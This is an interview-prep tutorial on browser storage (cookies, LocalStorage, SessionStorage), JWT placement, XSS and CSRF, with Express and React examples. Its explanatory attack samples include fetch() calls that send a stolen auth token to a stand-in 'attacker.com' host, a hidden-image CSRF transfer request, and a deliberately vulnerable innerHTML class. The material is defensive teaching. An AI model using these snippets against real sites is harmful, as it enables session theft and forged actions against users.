# 🌐 Phase 1: Topic 5 - Web Storage & Security

> **Interview Question:** "Cookies vs LocalStorage vs SessionStorage — when to use which? What are the security implications? Where should JWT be stored?"

---

## 💡 Beginner-Friendly Explanation (Web Dev Context)

First, understand that all three are **client-side storage** — data is stored in your **browser** (Chrome, Firefox, Safari), not on the server.

### 🍪 **Cookies — Server's Messenger**
- **Size:** Small (up to 4KB)
- **Job:** Send data to server (automatically attached to every request)
- **Example:** Login session token — server checks on every request whether user is authenticated
- **Web Dev Context:** "When you log into Amazon, a cookie is set. Next time you open a product page, browser automatically sends that cookie to Amazon server, so server knows it's the same user."

### 📦 **LocalStorage — Browser's Permanent Storage**
- **Size:** Large (5-10MB)
- **Job:** Store only client-side data (doesn't send to server)
- **Example:** User preferences (dark mode, language), shopping cart for guest users
- **Web Dev Context:** "When you turn on 'Dark Theme' on YouTube, that preference is saved in LocalStorage. Next time you open the site, JavaScript reads the theme preference from LocalStorage and applies it — no need to send anything to server."

### 🎫 **SessionStorage — Browser's Temporary Storage**
- **Size:** Large (5-10MB, like LocalStorage)
- **Job:** Data limited to current browser tab/window only
- **Example:** Multi-step form data, single-session shopping cart
- **Web Dev Context:** "When you're in a checkout process on an e-commerce site (Step 1: Address → Step 2: Payment → Step 3: Confirmation), data of each step can be saved in SessionStorage. If you close the browser, all data is cleared — next visit starts a fresh session."

```
Real-world flow:
┌─────────────────────────────────────────────────────────────┐
│  User Login → Server creates Session → Sends Cookie (ID)    │
│                                                             │
│  Cookie: "user_id=123, session_token=abc" (auto-sent)      │
│  LocalStorage: { theme: "dark", language: "hindi" }         │
│  SessionStorage: { currentForm: "step2", tempData: {...} }  │
└─────────────────────────────────────────────────────────────┘
```

---

## 📊 Technical Comparison — The Complete Breakdown

| Feature | Cookies | LocalStorage | SessionStorage |
|---------|---------|--------------|----------------|
| **Capacity** | ~4KB (4096 bytes) | ~5-10MB | ~5-10MB |
| **Expiration** | Manual (`Expires`/`max-age`) | Never (until deleted) | Browser close |
| **Sent to Server** | ✅ Yes (automatically with every request) | ❌ No | ❌ No |
| **Accessibility** | Client + Server | Client-side only (JavaScript) | Client-side only (JavaScript) |
| **Security** | `httpOnly`, `Secure`, `SameSite` flags | Vulnerable to XSS | Vulnerable to XSS |
| **Persistence** | Configurable (session or permanent) | Persistent (until deleted) | Session-only |
| **Scope** | Domain-wide | Domain-wide | Tab/Window specific |
| **API** | `document.cookie` (complex) | `localStorage.setItem()` (simple) | `sessionStorage.setItem()` (simple) |

---

## 🎯 When to Use What? (Decision Guide)

### 🍪 **Cookies — When Server Needs Data**

**Use Cases:**
1. **Authentication/Session Management** (with `httpOnly` flag)
2. **Remember Me** functionality
3. **Tracking & Analytics** (user behavior)
4. **Shopping cart** (e-commerce sites)
5. **Personalization** (language, region preferences)

**Example Scenarios:**
```
✅ Right Use:
- Login session token (httpOnly cookie)
- "Remember me" checkbox functionality
- Shopping cart (server needs to know)
- Language preference (for server-side rendering)

❌ Wrong Use:
- Store large data (capacity only 4KB)
- Sensitive data without encryption
- Data only needed client-side
```

### 📦 **LocalStorage — When Large Data Needed Client-Side**

**Use Cases:**
1. **User Preferences** (theme, font size, layout)
2. **Shopping Cart** (for guest users, before checkout)
3. **Offline Data** (PWA apps, cached content)
4. **Draft Content** (unsaved form data)
5. **Application State** (UI state, expanded sections)

**Example Scenarios:**
```
✅ Right Use:
- Dark mode / Light mode preference
- Language selection
- Draft blog post (auto-save)
- Cached API responses
- Shopping cart for guest users

❌ Wrong Use:
- Passwords or sensitive data
- Authentication tokens (XSS risk!)
- Personal/financial information
```

### 🎫 **SessionStorage — When Temporary, Single-Session Data Needed**

**Use Cases:**
1. **Multi-step Forms** (form data between steps)
2. **Single-session State** (tab-specific data)
3. **Temporary Calculations** (checkout process)
4. **Preventing Duplicate Submissions**

**Example Scenarios:**
```
✅ Right Use:
- Multi-step form data (step 1 → step 2 → step 3)
- Single-session shopping cart (until checkout)
- Temporary filter/sort state
- Preventing double form submission

❌ Wrong Use:
- Data needed in next session
- Authentication tokens
- Persistent user preferences
```

---

## 🔒 Security Implications — The Critical Part

### 🚨 **XSS (Cross-Site Scripting) Attack**

**What Is It?**
- Attacker injects **malicious JavaScript** into your website
- This JavaScript can **access LocalStorage/SessionStorage**
- All data can be **stolen**

**Attack Example:**
```javascript
// Suppose your site has XSS vulnerability
// Attacker injected this code:

const maliciousScript = `
  const stolenData = localStorage.getItem('auth_token');
  fetch('https://attacker.com/steal?data=' + stolenData);
`;

// Result: User's auth token stolen! 😱
```

**LocalStorage/SessionStorage Risk:**
```
❌ JWT token in LocalStorage:
localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIsIn...');

// Via XSS attack:
// 1. Attacker runs JavaScript
// 2. Calls localStorage.getItem('token')
// 3. Token stolen
// 4. Attacker can use user's identity
```

**Prevention:**
```javascript
// ✅ Right way: Use httpOnly cookies
res.cookie('token', jwtToken, {
  httpOnly: true,  // Not accessible via JavaScript
  secure: true,    // Send only over HTTPS
  sameSite: 'strict' // CSRF protection
});

// ❌ Wrong way:
localStorage.setItem('token', jwtToken); // Vulnerable to XSS
```

### 🚨 **CSRF (Cross-Site Request Forgery) Attack**

**What Is It?**
- Attacker takes user to **another site**
- That site sends **automatic requests** from user's browser
- **Cookies are automatically attached** (browser's default behavior)
- Attacker can **perform actions** on user's behalf

**Attack Example:**
```html
<!-- Attacker's website -->
<img src="https://your-bank.com/transfer?amount=1000&to=attacker"
     style="display:none">

<!-- When user visits attacker site -->
<!-- Browser automatically sends cookies -->
<!-- Bank thinks user initiated transfer! 😱 -->
```

**Why Cookies Are Vulnerable:**
```
Cookies automatically sent with every request:
┌─────────────────────────────────────────────────────┐
│ 1. User logged into bank.com (cookie set)           │
│ 2. User visits attacker.com (new tab)               │
│ 3. Request goes from attacker site to bank.com      │
│ 4. Browser AUTOMATICALLY attaches cookie           │
│ 5. Bank thinks legitimate user made request        │
│ 6. Transfer happens!                                │
└─────────────────────────────────────────────────────┘
```

**Prevention — SameSite Cookie Attribute:**
```javascript
// ✅ SameSite=Strict: Send only in same-site requests
res.cookie('session', sessionId, {
  sameSite: 'strict'  // Won't be sent in cross-site requests
});

// ✅ SameSite=Lax: Send in top-level navigation
res.cookie('session', sessionId, {
  sameSite: 'lax'  // Sent on link clicks, not forms/images
});

// ✅ CSRF Token (additional security)
// Add hidden token in form
<input type="hidden" name="csrf_token" value="abc123">
```

**LocalStorage/SessionStorage CSRF Safe:**
```
✅ Why LocalStorage/SessionStorage are CSRF-safe?
- Browser DOESN'T send them automatically
- Manual JavaScript code needed to send
- Attacker's script can't run on your site
- So CSRF attack doesn't happen

BUT: They're vulnerable to XSS! (Each has its own risk)
```

---

## 🔧 Code Examples — Practical Implementation

### Example 1: Secure Authentication with httpOnly Cookies

**What we're doing:** Implementing **secure authentication** on Express server:

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const app = express();

app.use(express.json());
app.use(cookieParser());

// Middleware: Verify token on every request
const authenticateToken = (req, res, next) => {
  const token = req.cookies.token; // Read from httpOnly cookie

  if (!token) {
    return res.status(401).json({ error: 'Access denied' });
  }

  try {
    const verified = jwt.verify(token, process.env.JWT_SECRET);
    req.user = verified;
    next();
  } catch (err) {
    res.status(400).json({ error: 'Invalid token' });
  }
};

// Login endpoint
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Verify user from database (simplified)
  const user = { id: 1, username: 'john' }; // Assume verified

  // Generate JWT token
  const token = jwt.sign(
    { userId: user.id, username: user.username },
    process.env.JWT_SECRET,
    { expiresIn: '1h' }
  );

  // ✅ SECURE: Store token in httpOnly cookie
  res.cookie('token', token, {
    httpOnly: true,      // ❌ Not accessible via JavaScript (XSS safe)
    secure: true,        // ✅ Send only over HTTPS (production)
    sameSite: 'strict',  // ✅ CSRF protection
    maxAge: 3600000      // 1 hour
  });

  res.json({ message: 'Logged in successfully', user });
});

// Protected route
app.get('/api/profile', authenticateToken, (req, res) => {
  res.json({
    message: 'Protected data',
    user: req.user
  });
});

// Logout endpoint
app.post('/logout', (req, res) => {
  // Expire the cookie
  res.cookie('token', '', {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    expires: new Date(0) // Past date = expire
  });

  res.json({ message: 'Logged out successfully' });
});

app.listen(3000);
```

**Key Security Points:**
- `httpOnly: true` — Not accessible via JavaScript (`document.cookie`) → **XSS safe**
- `secure: true` — Sent only over HTTPS connections → **Man-in-the-middle safe**
- `sameSite: 'strict'` — Not sent in cross-site requests → **CSRF safe**
- `maxAge: 3600000` — Auto-expires after 1 hour

---

### Example 2: LocalStorage for User Preferences

**What we're doing:** Saving user preferences (theme, language) in **LocalStorage**:

```javascript
// Theme Manager Class
class ThemeManager {
  constructor() {
    this.THEME_KEY = 'user_theme_preference';
    this.LANGUAGE_KEY = 'user_language_preference';
  }

  // Set theme
  setTheme(theme) {
    try {
      localStorage.setItem(this.THEME_KEY, theme);
      this.applyTheme(theme);
    } catch (error) {
      console.error('LocalStorage not available:', error);
    }
  }

  // Get theme
  getTheme() {
    try {
      return localStorage.getItem(this.THEME_KEY) || 'light';
    } catch (error) {
      console.error('Error reading theme:', error);
      return 'light';
    }
  }

  // Apply theme
  applyTheme(theme) {
    document.documentElement.setAttribute('data-theme', theme);

    // Update CSS variables
    if (theme === 'dark') {
      document.body.style.backgroundColor = '#1a1a2e';
      document.body.style.color = '#eaeaea';
    } else {
      document.body.style.backgroundColor = '#ffffff';
      document.body.style.color = '#333333';
    }
  }

  // Set language
  setLanguage(lang) {
    try {
      localStorage.setItem(this.LANGUAGE_KEY, lang);
    } catch (error) {
      console.error('Error saving language:', error);
    }
  }

  // Get language
  getLanguage() {
    try {
      return localStorage.getItem(this.LANGUAGE_KEY) || 'en';
    } catch (error) {
      return 'en';
    }
  }
}

// Usage
const themeManager = new ThemeManager();

// Initialize theme on page load
document.addEventListener('DOMContentLoaded', () => {
  const savedTheme = themeManager.getTheme();
  themeManager.applyTheme(savedTheme);
});

// Theme toggle button
document.getElementById('theme-toggle').addEventListener('click', () => {
  const currentTheme = themeManager.getTheme();
  const newTheme = currentTheme === 'light' ? 'dark' : 'light';
  themeManager.setTheme(newTheme);
});
```

**Why LocalStorage Is Safe Here:**
- Theme preference is **non-sensitive data**
- Even if XSS attack happens, no major loss
- Improves user experience (persistent preference)

---

### Example 3: SessionStorage for Multi-Step Form

**What we're doing:** Saving multi-step registration form data in **SessionStorage**:

```javascript
class MultiStepForm {
  constructor() {
    this.STORAGE_KEY = 'registration_form_data';
    this.currentStep = 1;
    this.totalSteps = 3;

    // Load existing data (in case browser refreshed)
    this.loadData();
  }

  // Save form data
  saveStepData(stepNumber, data) {
    try {
      // Load existing data
      const existingData = this.loadData() || {};

      // Merge new data
      existingData[`step${stepNumber}`] = data;
      existingData.currentStep = stepNumber;

      // Save in SessionStorage
      sessionStorage.setItem(this.STORAGE_KEY, JSON.stringify(existingData));

    } catch (error) {
      console.error('Error saving form data:', error);
    }
  }

  // Load form data
  loadData() {
    try {
      const data = sessionStorage.getItem(this.STORAGE_KEY);
      return data ? JSON.parse(data) : null;
    } catch (error) {
      console.error('Error loading form data:', error);
      return null;
    }
  }

  // Go to next step
  nextStep() {
    if (this.currentStep < this.totalSteps) {
      this.currentStep++;
      this.renderStep(this.currentStep);
    }
  }

  // Go to previous step
  prevStep() {
    if (this.currentStep > 1) {
      this.currentStep--;
      this.renderStep(this.currentStep);
    }
  }

  // Submit form
  async submitForm() {
    const completeData = this.loadData();

    if (!completeData) {
      alert('No form data found');
      return;
    }

    try {
      // Send to server
      const response = await fetch('/api/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(completeData)
      });

      if (response.ok) {
        // Success! Clear SessionStorage
        sessionStorage.removeItem(this.STORAGE_KEY);
        alert('Registration successful!');
        window.location.href = '/dashboard';
      }
    } catch (error) {
      console.error('Submission error:', error);
    }
  }

  // Render step
  renderStep(stepNumber) {
    const data = this.loadData();
    const stepData = data ? data[`step${stepNumber}`] : {};

    // Populate form fields
    // ... implementation
  }

  // Save data before browser close/refresh
  handleBeforeUnload(event) {
    if (this.currentStep < this.totalSteps) {
      event.preventDefault();
      event.returnValue = 'You have unsaved progress. Are you sure you want to leave?';
    }
  }
}

// Usage
const form = new MultiStepForm();

// Step 1: Personal Info
document.getElementById('step1-form').addEventListener('submit', (e) => {
  e.preventDefault();
  const data = {
    name: document.getElementById('name').value,
    email: document.getElementById('email').value
  };
  form.saveStepData(1, data);
  form.nextStep();
});

// Warning on browser close
window.addEventListener('beforeunload', (e) => form.handleBeforeUnload(e));
```

**Why SessionStorage Is Perfect Here:**
- Data is **temporary** (deleted after registration)
- **Tab-specific** (no conflict between multiple tabs)
- **Auto cleanup** on browser close
- **No server communication** needed

---

### Example 4: XSS Attack Demonstration & Prevention

**What we're doing:** Demonstrating XSS vulnerability and its **prevention**:

```javascript
// ❌ VULNERABLE CODE (Don't do this!)
class VulnerableApp {
  constructor() {
    // JWT token stored in LocalStorage (BAD!)
    this.storeToken('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');
  }

  storeToken(token) {
    localStorage.setItem('auth_token', token);
  }

  getToken() {
    return localStorage.getItem('auth_token');
  }

  // Displaying user input directly (XSS vulnerability!)
  displayUserProfile(username) {
    // ❌ WRONG: User input directly in HTML
    document.getElementById('username').innerHTML = username;
  }
}

// Attack scenario:
// 1. Attacker puts this script in a comment:
const maliciousUsername = '<script>stealToken()</script>';

// 2. When rendered:
vulnerableApp.displayUserProfile(maliciousUsername);
// Browser executes the script!

// 3. Attacker's script:
function stealToken() {
  const token = localStorage.getItem('auth_token');
  fetch('https://attacker.com/steal?token=' + token);
}

// Result: Token stolen! 😱

// ✅ SECURE CODE (Do this instead!)
class SecureApp {
  constructor() {
    // Token stored in httpOnly cookie
    // (Should be set server-side, not client-side)
  }

  // Sanitize user input
  sanitizeInput(input) {
    const div = document.createElement('div');
    div.textContent = input; // Automatically escapes HTML
    return div.innerHTML;
  }

  // Safe display
  displayUserProfile(username) {
    // ✅ RIGHT: Use sanitized output
    document.getElementById('username').textContent = username;
    // OR
    document.getElementById('username').innerHTML = this.sanitizeInput(username);
  }

  // Content Security Policy (CSP) headers set
  // Server-side:
  // res.setHeader('Content-Security-Policy', "default-src 'self'");
}
```

**Security Headers for XSS Prevention:**
```javascript
// Express middleware for security headers
const helmet = require('helmet');
app.use(helmet()); // Automatic security headers

// Manual headers:
app.use((req, res, next) => {
  // XSS protection
  res.setHeader('X-XSS-Protection', '1; mode=block');

  // Content Security Policy
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self'"
  );

  // Prevent MIME type sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');

  next();
});
```

---

### Example 5: Complete Auth Flow with Secure Cookies

**What we're doing:** Building a complete **authentication system**:

```javascript
// Backend (Node.js/Express)
const express = require('express');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');
const cookieParser = require('cookie-parser');
const app = express();

app.use(express.json());
app.use(cookieParser());

// Database (simplified)
const users = [
  { id: 1, username: 'john', password: '$2b$10$...' } // Hashed password
];

// Register endpoint
app.post('/register', async (req, res) => {
  const { username, password } = req.body;

  // Hash password
  const hashedPassword = await bcrypt.hash(password, 10);

  // Save user (in database)
  const newUser = { id: Date.now(), username, password: hashedPassword };
  users.push(newUser);

  res.status(201).json({ message: 'User registered successfully' });
});

// Login endpoint
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Find user
  const user = users.find(u => u.username === username);
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Verify password
  const validPassword = await bcrypt.compare(password, user.password);
  if (!validPassword) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Generate JWT token
  const token = jwt.sign(
    { userId: user.id, username: user.username },
    process.env.JWT_SECRET,
    { expiresIn: '1h' }
  );

  // ✅ SECURE: Set httpOnly cookie
  res.cookie('auth_token', token, {
    httpOnly: true,      // Not accessible via JavaScript
    secure: true,        // HTTPS only (production)
    sameSite: 'strict',  // CSRF protection
    maxAge: 3600000      // 1 hour
  });

  res.json({
    message: 'Logged in successfully',
    user: { id: user.id, username: user.username }
  });
});

// Protected route middleware
const protectRoute = (req, res, next) => {
  const token = req.cookies.auth_token;

  if (!token) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    res.status(403).json({ error: 'Invalid token' });
  }
};

// Get user profile (protected)
app.get('/api/profile', protectRoute, (req, res) => {
  res.json({
    user: req.user,
    message: 'This is protected data'
  });
});

// Logout
app.post('/logout', (req, res) => {
  res.cookie('auth_token', '', {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    expires: new Date(0) // Expire immediately
  });

  res.json({ message: 'Logged out successfully' });
});

// Frontend (React example)
function App() {
  const [user, setUser] = useState(null);

  // Login function
  const login = async (username, password) => {
    try {
      const response = await fetch('/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password }),
        credentials: 'include' // Include cookies
      });

      if (response.ok) {
        const data = await response.json();
        setUser(data.user);
      }
    } catch (error) {
      console.error('Login error:', error);
    }
  };

  // Get profile (cookie sent automatically)
  const getProfile = async () => {
    try {
      const response = await fetch('/api/profile', {
        credentials: 'include' // Include cookies
      });

      if (response.ok) {
        const data = await response.json();
        console.log('Profile:', data);
      }
    } catch (error) {
      console.error('Error:', error);
    }
  };

  // Logout
  const logout = async () => {
    await fetch('/logout', {
      method: 'POST',
      credentials: 'include'
    });
    setUser(null);
  };

  return (
    <div>
      <button onClick={() => login('john', 'password123')}>Login</button>
      <button onClick={getProfile}>Get Profile</button>
      <button onClick={logout}>Logout</button>
    </div>
  );
}
```

---

## ⚠️ Common Pitfalls & Solutions

### Problem 1: JWT in LocalStorage (❌ Most Common Mistake)

**Scenario:** Developers store JWT token in LocalStorage for "convenience".

**Why It's Wrong:**
```javascript
// ❌ WRONG - XSS vulnerable
localStorage.setItem('token', jwtToken);

// Attack:
// 1. XSS vulnerability exploited
// 2. Attacker calls localStorage.getItem('token')
// 3. Token stolen
// 4. Attacker can perform actions as user
```

**Solution:**
```javascript
// ✅ RIGHT - Use httpOnly cookies
res.cookie('token', jwtToken, {
  httpOnly: true,      // XSS safe
  secure: true,        // HTTPS only
  sameSite: 'strict'   // CSRF safe
});
```

### Problem 2: Forgetting `Secure` Flag in Production

**Scenario:** `secure: false` works in development, fails in production.

**Solution:**
```javascript
// Environment-based configuration
const isProduction = process.env.NODE_ENV === 'production';

res.cookie('token', jwtToken, {
  httpOnly: true,
  secure: isProduction, // Development: false, Production: true
  sameSite: 'strict',
  maxAge: 3600000
});
```

### Problem 3: Not Setting `SameSite` Attribute

**Scenario:** CSRF attacks happening because cookies sent cross-site.

**Solution:**
```javascript
// Always set SameSite
res.cookie('token', jwtToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict', // or 'lax' depending on use case
  maxAge: 3600000
});

// SameSite options:
// - 'strict': Only in same-site requests
// - 'lax': Sent in top-level navigation
// - 'none': Sent cross-site (secure: true required)
```

### Problem 4: Storing Sensitive Data in Any Client Storage

**Scenario:** Developers store passwords, credit card numbers client-side.

**Solution:**
```javascript
// ❌ NEVER store sensitive data client-side
localStorage.setItem('password', password); // BIG NO!
sessionStorage.setItem('creditCard', cardNumber); // NO!

// ✅ Store server-side only
// Securely store in database
// Keep only non-sensitive data on client
```

### Problem 5: Not Handling Storage Quota Exceeded

**Scenario:** LocalStorage gets full, app crashes.

**Solution:**
```javascript
function safeSetStorage(key, value) {
  try {
    localStorage.setItem(key, value);
  } catch (error) {
    if (error.name === 'QuotaExceededError') {
      console.warn('LocalStorage quota exceeded');
      // Fallback: Clear old data or send to server
      clearOldData();
    }
  }
}

function clearOldData() {
  // Implement LRU (Least Recently Used) cleanup
  // Or sync important data to server
}
```

---

## 🌍 Security Best Practices Summary

### 🔐 **Cookie Security Flags**

| Flag | Purpose | Example |
|------|---------|---------|
| `httpOnly` | Block JavaScript access | `Set-Cookie: token=abc; httpOnly` |
| `Secure` | HTTPS-only transmission | `Set-Cookie: token=abc; Secure` |
| `SameSite=Strict` | Block cross-site requests | `Set-Cookie: token=abc; SameSite=Strict` |
| `SameSite=Lax` | Allow top-level navigation | `Set-Cookie: token=abc; SameSite=Lax` |
| `Max-Age` | Expiration in seconds | `Set-Cookie: token=abc; Max-Age=3600` |
| `Expires` | Expiration date | `Set-Cookie: token=abc; Expires=Wed, 01 Jan 2025 13:00:00 GMT` |
| `Path` | Cookie scope | `Set-Cookie: token=abc; Path=/admin` |
| `Domain` | Cookie domain | `Set-Cookie: token=abc; Domain=.example.com` |

### 🛡️ **Content Security Policy (CSP)**

```javascript
// Server-side CSP headers
res.setHeader('Content-Security-Policy',
  "default-src 'self'; " +           // Default: same origin
  "script-src 'self'; " +            // Scripts: same origin only
  "style-src 'self' 'unsafe-inline'; " + // Styles: inline allowed
  "img-src 'self' data: https:; " +  // Images: self, data URLs, HTTPS
  "connect-src 'self' https://api.example.com; " + // API calls
  "frame-ancestors 'none'; " +       // No iframes
  "form-action 'self'"               // Forms: same origin only
);
```

### 🎯 **Decision Matrix**

| Use Case | Recommended Storage | Why |
|----------|-------------------|-----|
| **Authentication Token** | httpOnly Cookie | XSS safe, CSRF safe with SameSite |
| **User Preferences** | LocalStorage | Non-sensitive, persistent, large capacity |
| **Shopping Cart (Guest)** | LocalStorage | Persistent, no server sync needed |
| **Shopping Cart (Logged In)** | Database + Cookie | Server-side persistence |
| **Multi-step Form** | SessionStorage | Temporary, tab-specific |
| **Draft Content** | LocalStorage | Auto-save, persistent |
| **Analytics/Tracking** | Cookie | Server needs to read |
| **Sensitive Data** | ❌ Never client-side | Security risk |

---

## 🎙️ Interview Articulation (How to Answer)

### Q: "Is storing JWT in LocalStorage safe?"

**Answer:** "Sir, storing JWT in LocalStorage is **not safe** because LocalStorage is accessible via JavaScript. If there's an XSS (Cross-Site Scripting) vulnerability in the website, attacker can steal the token via JavaScript. **Best practice** is to store JWT in **httpOnly cookies**, which are not accessible via JavaScript. Also always set `Secure` flag (HTTPS-only) and `SameSite=Strict` (CSRF protection)."

### Q: "Cookies vs LocalStorage for authentication — which is better?"

**Answer:** "**httpOnly cookies** are better for authentication because:
1. **XSS Protection:** Not accessible via JavaScript, so safe from XSS attacks
2. **Automatic Transmission:** Sent automatically with every request
3. **Security Flags:** Additional security via `httpOnly`, `Secure`, `SameSite` flags

LocalStorage is XSS vulnerable because it's directly accessible via JavaScript. But LocalStorage is safe to use for **non-sensitive data** like user preferences, theme settings."

### Q: "What is CSRF attack and how to prevent it?"

**Answer:** "CSRF (Cross-Site Request Forgery) attack is when attacker takes user to a malicious site and sends **unauthorized requests** from user's browser. Since cookies are automatically attached, server thinks legitimate user made the request.

**Prevention methods:**
1. **SameSite Cookie Attribute:** Set `SameSite=Strict` or `SameSite=Lax`
2. **CSRF Tokens:** Include unique token in every form
3. **Referer Header Check:** Validate cross-origin requests
4. **Re-authentication:** Ask for password again for sensitive actions"

### Q: "How to prevent XSS?"

**Answer:** "XSS prevention uses multiple layers:
1. **Input Sanitization:** Escape/encode user input before displaying
2. **Content Security Policy (CSP):** Set `script-src 'self'` to block external scripts
3. **httpOnly Cookies:** Store sensitive data (tokens) in httpOnly cookies
4. **Output Encoding:** Encode based on HTML, JavaScript, URL context
5. **Framework Security:** Frameworks like React, Angular automatically prevent XSS"

### Q: "What's the difference between LocalStorage, SessionStorage and Cookies?"

**Answer:** "All three are client-side storage but for different use cases:

| Aspect | Cookies | LocalStorage | SessionStorage |
|--------|---------|--------------|----------------|
| **Capacity** | 4KB | 5-10MB | 5-10MB |
| **Server Access** | Automatic | Manual | Manual |
| **Persistence** | Configurable | Permanent | Session-only |
| **Security** | httpOnly possible | XSS vulnerable | XSS vulnerable |
| **Use Case** | Auth, tracking | Preferences | Temporary data |

**Rule of thumb:** Auth tokens → httpOnly cookies, User preferences → LocalStorage, Temporary form data → SessionStorage."

### Q: "What's the difference between session cookies and persistent cookies?"

**Answer:** "**Session cookies** are automatically deleted when browser closes (no `Expires` or `Max-Age` set). **Persistent cookies** stay for a specific time (`Expires` or `Max-Age` set). Session cookies are for temporary sessions (like banking), persistent cookies are for 'Remember Me' functionality."

---

## 📝 Quick Reference (Summary)

### Storage Comparison:

| Feature | Cookies | LocalStorage | SessionStorage |
|---------|---------|--------------|----------------|
| **Size Limit** | 4KB | 5-10MB | 5-10MB |
| **Expiration** | Manual/Auto | Never | Browser close |
| **Server Access** | ✅ Automatic | ❌ No | ❌ No |
| **JavaScript Access** | If not httpOnly | ✅ Yes | ✅ Yes |
| **XSS Vulnerable** | ❌ No (if httpOnly) | ✅ Yes | ✅ Yes |
| **CSRF Vulnerable** | ✅ Yes | ❌ No | ❌ No |
| **Persistence** | Configurable | Permanent | Temporary |
| **Scope** | Domain-wide | Domain-wide | Tab-specific |

### Security Checklist:

| Security Measure | Implementation |
|-----------------|----------------|
| **Auth Tokens** | httpOnly + Secure + SameSite cookies |
| **XSS Prevention** | Input sanitization + CSP headers |
| **CSRF Prevention** | SameSite cookies + CSRF tokens |
| **Sensitive Data** | Never store client-side |
| **HTTPS** | Always use `Secure` flag in production |
| **Token Expiration** | Set appropriate `Max-Age` |

### Best Practices:

```
✅ DO:
- Auth tokens → httpOnly cookies
- User preferences → LocalStorage
- Temporary data → SessionStorage
- Set Secure flag in production
- Use SameSite=Strict for sensitive operations
- Implement CSP headers
- Sanitize all user inputs

❌ DON'T:
- Store JWT in LocalStorage
- Store passwords/sensitive data client-side
- Forget Secure flag in production
- Use cookies without SameSite
- Trust user input without sanitization
- Store more than needed in client storage
```

### Browser DevTools Check:

```
1. Application Tab → Storage section:
   - Cookies: Check domain, path, expiration
   - Local Storage: Check key-value pairs
   - Session Storage: Check temporary data

2. Security Tab:
   - Verify HTTPS status
   - Check mixed content warnings

3. Network Tab:
   - Check cookies in request headers
   - Check Set-Cookie in response headers
```

---

## 🚀 Next Steps

Now you're ready for **Topic 6: CORS**! CORS (Cross-Origin Resource Sharing) is the mechanism browser uses to control cross-domain API calls. It's the natural next step after Web Storage since both are browser security features.

---

> **Pro Tip:** When discussing security in an interview, always mention the **defense-in-depth** approach — "We use multiple layers of security: httpOnly cookies for auth, CSP headers for XSS, SameSite for CSRF, and input validation for data integrity." This shows you have a holistic security mindset! 🔒
